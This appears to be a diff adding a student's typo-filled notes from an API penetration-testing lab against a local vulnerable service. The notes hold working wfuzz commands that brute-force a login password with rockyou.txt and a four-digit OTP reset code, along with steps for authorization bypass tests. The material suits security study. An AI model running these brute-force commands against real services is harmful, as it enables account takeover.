@@ -1,0 +1,30 @@
+01==Scanning APIs vUlnerabilities
+
+1=nikto -h http:127.0.0.:8888
+
+2=owasp ZAP
+2.1=>Zapproxy automated scan
+http://127.0.0.:8888
+
+2..2=> do manual explore(same as auto)
+
+02==Classic Authentication Attacks
+stop mitmweb, go postman , in proxy option make its port 8080; open burpsuit in proxy settings option do same port for listening  -> now from previous created postmans documentation do request and capture it on burp(first send login request) -> send it to repeater -> do again and agin request to check rate limit or looking for rsponso code -> w=if no changes we do bruteforce -> snd that request t repeater -> this time i use wfuzz
+
+wfuzz -d '{"email":"test1@email.com","password":"FUZZ"}' -H 'Content-Type: application/json' -z file,rockyou.txt -u http://127.0.0.1:8888/identity/api/auth/login
+
+03=> BOLA( Broken object level authorization)
+usar A can see some information of user B ( is it also call IDOR???)
+From community post response got user id send it another identity req
+
+04=>BFLA(Broken Function Level Authorization)
+ in collection order section ; order id 10 to something else
+ task = uploaded video rename , put method to delete method ,try to delete the video user to admin privilege
+ 
+ 05=>Advanced Vulnerability Exploitation
+ Postman Runner; collection runner
+ can check api version with 1 option cng to check all clollection, nice it really
+ 
+ -> after check v3 on mitmproxy2swagger last- > forgot password -> check otp endpoint we use otp brute force by this command 
+wfuzz -d '{"email":"test@test.com", "otp":"FUZZ", "password":"NewPassword@123"}' -H 'Content-Type: application/json' -z file,/usr/share/seclists/Fuzzing/4-digits-0000-9999.txt -u http://127.0.0.1:8888/identity/api/auth/v2/check-otp --hc 500
+
